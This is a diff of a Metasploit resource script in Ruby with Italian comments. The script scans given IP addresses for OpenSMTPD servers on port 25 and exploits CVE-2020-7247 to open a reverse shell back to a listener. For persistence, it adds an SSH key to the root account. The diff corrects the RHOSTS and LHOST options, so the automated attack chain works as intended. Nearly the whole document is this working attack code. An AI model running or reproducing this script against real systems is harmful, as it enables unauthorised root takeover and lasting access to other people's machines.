@@ -1,8 +1,8 @@
-<ruby>                                                                                                                                                                                        
-#                                                                                                                                                                                             
-# Stampa guida                                                                                                                                                                    
-#                                                                                                                                                                                             
-def help_me                                                                                                                                                                                   
+<ruby>                                                                                                                                                                      
+#                                                                                                                                                                           
+# Stampa guida                                                                                                                                                              
+#                                                                                                                                                                           
+def help_me                                                                                                                                                                 
     help = %Q|
     Descrizione:
             Questo resource script Metasploit rileva tra le macchine in targetIPs quali sono server opensmtpd e le attacca sfruttando la vulnerabilità CVE-2020-7247 per aprire una reverse shell ed aggiungere una chiave ssh all'utente root.
@@ -11,7 +11,7 @@ def help_me
                 auxiliary/scanner/ssh/ssh_login_pubkey
                 https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/auxiliary/scanner/ssh/ssh_login_pubkey.md
 
-            Moduli utilizzati durante il processo di attacco: 
+            Moduli utilizzati durante il processo di attacco:
 
                 pre exploit:
                     https://attack.mitre.org/techniques/T1595/001/
@@ -28,7 +28,7 @@ def help_me
                     https://attack.mitre.org/techniques/T1210/
                     exploit/unix/smtp/opensmtpd_mail_from_rce
                     https://www.rapid7.com/db/modules/exploit/unix/smtp/opensmtpd_mail_from_rce/
-            
+
                     https://attack.mitre.org/techniques/T1059/004/
                     payload per ottenere reverse shell:
                     payload/cmd/unix/reverse_openssl
@@ -72,7 +72,7 @@ def execute_attack(workspace, targetIPs, listeningIP)
     # si sposta nel workspace specificato come parametro,
     # se non esiste lo crea in automatico
     run_single("workspace -a #{workspace}")
-    
+
     # PRE-EXPLOIT
     # seleziona come modulo attivo lo scanner di porte tcp
     run_single("use auxiliary/scanner/portscan/tcp")
@@ -80,10 +80,10 @@ def execute_attack(workspace, targetIPs, listeningIP)
     # controlli se gli indirizzi ip targetIPs hanno la porta 25 aperta
     run_single("set PORTS 25")
     run_single("set THREADS 10")
-    run_single("set LHOSTS #{targetIPs}")
+    run_single("set RHOSTS #{targetIPs}")
     # esegue scanner porte tcp
     run_single("run")
-    
+
     # seleziona come modulo attivo lo scanner del servizio smtp
     run_single("use auxiliary/scanner/smtp/smtp_version")
     # tra le macchine salvate nel db filtra tutte quelle con la porta 25 aperta
@@ -91,7 +91,7 @@ def execute_attack(workspace, targetIPs, listeningIP)
     run_single("services -p 25 -R")
     # esegue scanner che raccoglie informazioni su che server smtp viene usato
     run_single("run")
-    
+
     # EXPLOIT
     # seleziona come modulo attivo l'exploit che sfrutta la vulnerabilità CVE-2020-7247
     run_single("use exploit/unix/smtp/opensmtpd_mail_from_rce")
@@ -102,7 +102,7 @@ def execute_attack(workspace, targetIPs, listeningIP)
     # imposta come obiettivo dell'exploit tutti i server opensmtpd
     run_single("services -S opensmtpd -R")
     # imposta l'indirizzo ip su cui avviare il listener per la reverse shell
-    run_single("set RHOST #{listeningIP}")
+    run_single("set LHOST #{listeningIP}")
     # COMPATIBILITY MOD
     run_single("set TARGET 0")
     # esegue exploit
@@ -112,7 +112,7 @@ def execute_attack(workspace, targetIPs, listeningIP)
 
     # ottiene gli id delle shell aperte dall'exploit al passo precedente
     mySessionIDs = mySessions.keys
-    
+
     # POST-EXPLOT
     for sessionID in mySessionIDs
         # ottiene la permanenza aggiungendo una chiave ssh alla macchina vittima
